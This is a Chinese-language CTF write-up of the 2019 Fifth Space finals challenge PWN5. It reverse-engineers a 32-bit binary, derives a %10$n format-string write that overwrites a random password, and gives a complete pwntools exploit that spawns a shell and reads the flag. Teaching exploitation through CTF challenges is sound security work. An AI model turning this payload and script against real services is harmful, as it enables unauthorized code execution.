# Speedrun：第五空间2019决赛 PWN5

> 题型：格式化字符串任意写 / 条件绕过
> 目标：用 `%10$n` 把 `0x804c044` 的随机密码改成 4，再输入 4
> 关键：format arg **10**；目标 **0x804c044**；密码 **4**

---

## 0. 一句话结论

```text
32 位 i386，Canary + NX + No PIE + Partial RELRO
但 Canary 是纯干扰项：这题根本没有栈溢出。

main:
  open("/dev/urandom", 0)
  read(fd, 0x804c044, 4)       <- 随机密码存到全局
  printf("your name:")
  read(0, name, 0x63)          <- name @ ebp-0x70
  printf("Hello,")
  printf(name)                 <- 格式化字符串漏洞
  printf("your passwd:")
  read(0, pass, 0xf)           <- pass @ ebp-0x80
  if (atoi(pass) == *(0x804c044))
      system("/bin/sh")

不要猜随机数，直接改随机数：
  name = p32(0x804c044) + b"%10$n"
  pass = b"4"
```

Payload：

```python
p32(0x804c044) + b"%10$n"
# 第二个输入：
b"4"
```

`%n` 写入的是“已经打印了多少字符”。前面 4 字节地址已经打印，所以写入 4。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/format_string_write'

file '[第五空间2019决赛]PWN5'
checksec --file='[第五空间2019决赛]PWN5'
strings -tx '[第五空间2019决赛]PWN5' | grep -E 'urandom|your name|your passwd|Hello|ok!!|fail|/bin/sh'
objdump -d -M intel '[第五空间2019决赛]PWN5' --start-address=0x80491f2 --stop-address=0x8049360
```

关键输出：

```text
ELF 32-bit LSB executable, Intel i386, dynamically linked, stripped
Partial RELRO
Canary found
NX enabled
No PIE (0x8048000)
Stripped

2008 /dev/urandom
2015 your name:
2020 Hello,
2027 your passwd:
2034 fail
2039 ok!!
203e /bin/sh
```

读法：

| 观察 | 结论 |
| --- | --- |
| 32 位 i386 | cdecl，格式化参数在栈上，4 字节一个槽 |
| Stripped | 没有符号，但 `_start` 会把 main 地址传给 `__libc_start_main`，能定位 |
| Canary found | 干扰项：name/pass 的 `read` 长度都没有越过 canary |
| No PIE | 全局 `0x804c044` 地址固定，直接写 |
| `printf(name)` | 唯一的漏洞点：用户输入被当格式串 |
| `/bin/sh` + `system@plt` | 成功分支直接给 shell |

`_start` 定位 main：

```asm
080490e0 <_start>:
  ...
  8049106: mov    eax,0x80491f2
  804910c: push   eax
  804910d: call   80490b0 <__libc_start_main@plt>
```

所以：

```text
main = 0x80491f2
```

---

## 2. 关键逆向

### 2.1 随机密码与两个输入

```asm
8049234: push   0x0
8049236: call   8049050 <time@plt>
...
8049242: call   80490a0 <srand@plt>
...
804924d: push   0x0
804924f: lea    eax,[ebx-0x1ff8]        # 0x804a008 "/dev/urandom"
8049255: push   eax
8049256: call   8049090 <open@plt>
...
8049267: push   0x4
8049269: mov    eax,0x804c044
804926f: push   eax
8049270: push   DWORD PTR [ebp-0x84]    # fd
8049276: call   8049030 <read@plt>       # read(fd, 0x804c044, 4)
```

```asm
8049281: lea    eax,[ebx-0x1feb]        # "your name:"
8049288: call   8049040 <printf@plt>
8049293: push   0x63
8049295: lea    eax,[ebp-0x70]           # name
8049298: push   eax
8049299: push   0x0
804929b: call   8049030 <read@plt>       # read(0, name, 0x63)
```

```asm
80492a6: lea    eax,[ebx-0x1fe0]        # "Hello,"
80492ad: call   8049040 <printf@plt>
80492b8: lea    eax,[ebp-0x70]           # name
80492bb: push   eax
80492bc: call   8049040 <printf@plt>     # printf(name)  <-- 漏洞
80492c7: lea    eax,[ebx-0x1fd9]        # "your passwd:"
80492ce: call   8049040 <printf@plt>
```

注意顺序：`printf("your passwd:")` 在 `printf(name)` **之后**。  
所以 exp 发送 name 后，直接 `recvuntil(b"your passwd:")` 即可，不用等一个干净的换行。

### 2.2 比较与成功分支

```asm
80492d9: push   0xf
80492db: lea    eax,[ebp-0x80]           # pass
80492de: push   eax
80492df: push   0x0
80492e1: call   8049030 <read@plt>       # read(0, pass, 0xf)
...
80492f0: call   80490d0 <atoi@plt>
80492f8: mov    edx,eax
80492fa: mov    eax,0x804c044
8049300: mov    eax,DWORD PTR [eax]      # 随机密码
8049302: cmp    edx,eax
8049304: je     804931a                 # 相等 -> 成功
...
8049324: call   8049070 <puts@plt>       # "ok!!"
8049336: call   8049080 <system@plt>     # system("/bin/sh")
```

### 2.3 栈布局：没有溢出

```text
ebp-0x84 .. ebp-0x81 : fd
ebp-0x80 .. ebp-0x72 : pass[15]      read 0xf
ebp-0x70 .. ebp-0x0d : name[99]      read 0x63
ebp-0x0c .. ebp-0x09 : canary
```

- `name` 的 99 字节刚好在 canary 前停止。
- `pass` 的 15 字节也到不了 canary。
- 所以 Canary 完全碰不到；这不是栈溢出题。

漏洞只在：

```c
printf(name);
```

---

## 3. 为什么 `%10$n` 正好命中 name

32 位 cdecl 下，`printf` 的格式化参数都在栈上：

```text
printf 入口：
  [esp]     return address
  [esp+4]   format pointer (name)
  [esp+8]   %1$
  [esp+0xc] %2$
  ...
```

在 `printf(name)` 调用点，name 缓冲区在 `ebp-0x70`，它对应的参数槽是：

```text
argN 地址 = ebp - 0x94 + 4 * (N - 1)
想要 ebp - 0x70：
  4 * (N - 1) = 0x24
  N - 1 = 9
  N = 10
```

所以：

```text
name 的前 4 字节 = %10$ 的参数
```

本地实测矩阵：

| 格式串 | 结果 |
| --- | --- |
| `%9$n` | EOF / 崩溃，写到了别的栈槽 |
| `%10$n` | `ok!!` + shell |
| `%11$n` | EOF / 崩溃，写到了别的栈槽 |

`%10$n` 把 name 的前 4 字节当成目标地址：

```text
name[0:4] = p32(0x804c044) = 44 c0 04 08
```

这个地址没有 `\x00`，所以 `printf` 不会在地址中间截断，能继续读后面的 `%10$n`。

`%n` 写入 4，因为地址 4 字节已经输出。于是：

```text
*(0x804c044) = 4
```

第二个输入发 `b"4"`，`atoi("4") == 4`，条件成立，进入 `system("/bin/sh")`。

---

## 4. 完整 exp

```python
from pwn import *
import os
import re
import ssl
import sys
import time

context.arch = "i386"
context.log_level = "info"

BIN = "./[第五空间2019决赛]PWN5"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))

PASSWORD_ADDR = 0x804C044
FORMAT_OFFSET = 10


def start():
    if args.LOCAL:
        ld = os.getenv("I386_LD")
        libpath = os.getenv("I386_LIBPATH")
        if ld:
            return process([ld, "--library-path", libpath, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit("[-] set HOST/PORT, or pass LOCAL")

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def exploit():
    p = start()

    p.recvuntil(b"your name:")
    payload = p32(PASSWORD_ADDR) + f"%{FORMAT_OFFSET}$n".encode()
    p.sendline(payload)

    p.recvuntil(b"your passwd:")
    p.sendline(b"4")

    time.sleep(0.2)
    p.sendline(b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit")

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")


if __name__ == "__main__":
    exploit()
```

### 本地验证（需要 i386 loader）

如果系统已经装了 `libc6-i386`：

```bash
cd '/home/yfhd5/Pwn Writeups/format_string_write'
python 08_fifth_space_2019_pwn5_exp.py LOCAL
```

如果不想动系统包，可以只下载并解包到 `/tmp`：

```bash
cd /tmp
apt-get download libc6-i386=2.43-2ubuntu2
mkdir -p libc6i386
dpkg-deb -x libc6-i386_*_amd64.deb libc6i386

cd '/home/yfhd5/Pwn Writeups/format_string_write'
I386_LD=/tmp/libc6i386/usr/lib32/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc6i386/usr/lib32 \
python 08_fifth_space_2019_pwn5_exp.py LOCAL
```

正确时看到：

```text
ok!!
__PWNED__
```

说明 `atoi("4")` 与改写后的全局值匹配，`system("/bin/sh")` 已经执行。

---

## 5. 交互坑

1. **`%10$n` 不是 `%6$n`**
   32 位下格式化参数从 `[esp+8]` 开始，name 在 `ebp-0x70`，对应第 10 个参数。
   本地实测 `%9` / `%11` 都会崩。

2. **密码要发 `4`，不是 `0`**
   `%n` 写入的是已经打印的字符数。
   4 字节地址已经输出，所以写入的值是 4，不是 0。

3. **地址不能含 `\x00`**
   `0x0804c044` 的小端字节是 `44 c0 04 08`，没有 NUL，格式串不会被截断。
   如果换成含 NUL 的目标地址，`printf` 会在地址中间停止。

4. **不要等 `your passwd:` 之前的换行**
   `printf(name)` 会先把地址的原始字节打出来，输出很脏。
   直接 `recvuntil(b"your passwd:")`，不要 `recvline()` 等“干净提示”。

5. **Canary 是烟雾弹**
   name/pass 的 `read` 长度都没有越过 canary。  
   这题不需要 canary leak，也不需要栈溢出。

6. **Partial RELRO 也是烟雾弹**
   GOT 可写，但 `%10$n` 直接写全局 `0x804c044` 更短、更稳。
   不需要改 `atoi@got` 为 `system@plt`。

7. **本地 32 位环境**
   没有 `/lib/ld-linux.so.2` 时，`process(BIN)` 会直接 `ENOENT`。
   用 `libc6-i386` 或 `I386_LD` / `I386_LIBPATH`。

8. **远程协议**
   原题可能是明文 TCP；脚本默认 `remote(HOST, PORT)`。
   平台要 TLS 时设置 `SSL=1`。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec`：32 位、No PIE、Canary、Partial RELRO |
| 0:20–0:40 | `strings` + `objdump`：看到 `/dev/urandom`、`printf(name)`、`0x804c044` |
| 0:40–1:00 | 算 format offset：`%10$` 命中 name 前 4 字节 |
| 1:00–1:15 | 发 `p32(0x804c044) + b"%10$n"`，再发 `"4"` |
| 1:15–1:35 | 本地 i386 验证：`ok!!` + `__PWNED__` |
| 1:35–1:50 | 打远程，`cat flag*` 收工 |

---

## 7. 题型识别卡

```text
32 位 + No PIE + 程序把用户输入直接传给 printf
+ 后面用 atoi(input) 与全局变量比较
+ 成功分支 system("/bin/sh")
= 格式化字符串任意写：直接把被比较的全局变量改成已知值
```

一句话：**不要猜 `/dev/urandom`；`%10$n` 把 `0x804c044` 写成 4，然后输入 `4`。**

